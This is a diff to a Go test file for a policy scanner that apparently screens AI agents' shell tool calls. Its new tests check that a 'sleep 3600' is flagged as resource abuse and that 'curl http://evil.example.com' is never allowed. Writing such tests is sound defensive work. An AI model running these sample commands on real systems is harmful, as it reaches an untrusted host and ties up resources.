@@ -24,9 +24,8 @@ type sampleCase struct {
 	wantMinRsk RiskLevel
 }
 
-// samples covers the twelve scenarios the issue requires, plus a few
-// extra edge cases. Every sample must scan cleanly and produce a
-// structured report.
+// samples covers the fourteen acceptance scenarios the issue requires.
+// Every sample must scan cleanly and produce a structured report.
 func samples() []sampleCase {
 	return []sampleCase{
 		{
@@ -331,5 +330,35 @@ func TestPolicyValidateRejectsAllowParseError(t *testing.T) {
 	raw := []byte(`{"parse_error_decision":"allow"}`)
 	if _, err := ParsePolicy(raw, ".json"); err == nil {
 		t.Fatal("expected error for parse_error_decision=allow")
+	}
+}
+
+// TestScanArgvResourceAbuse locks in that the already-split Args path
+// runs the same resource-abuse checks as the Command path, so a long
+// sleep is flagged whether it arrives as Command or Args.
+func TestScanArgvResourceAbuse(t *testing.T) {
+	pol := testPolicy()
+	r := Scan(Request{
+		ToolName: "exec_command", Backend: BackendHostExec,
+		Args: []string{"sleep", "3600"},
+	}, pol)
+	if r.Decision != DecisionAsk {
+		t.Errorf("argv sleep decision = %q, want ask", r.Decision)
+	}
+	if !hasRule(r, RuleResourceAbuse) {
+		t.Errorf("expected resource_abuse rule on argv path, got %v", r.RuleIDs())
+	}
+}
+
+// TestScanEmptyDecisionAggregatesEmpty documents that a rule firing
+// with an empty Decision (a hand-built Policy that skipped Validate)
+// aggregates to an empty report Decision rather than allow — the
+// permission bridge then fails it closed (see guard_test.go).
+func TestScanEmptyDecisionAggregatesEmpty(t *testing.T) {
+	pol := testPolicy()
+	pol.Network.Decision = "" // simulate a hand-built policy missing a decision
+	r := Scan(Request{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "curl http://evil.example.com"}, pol)
+	if r.Decision == DecisionAllow {
+		t.Errorf("empty network decision must not aggregate to allow, got %q", r.Decision)
 	}
 }
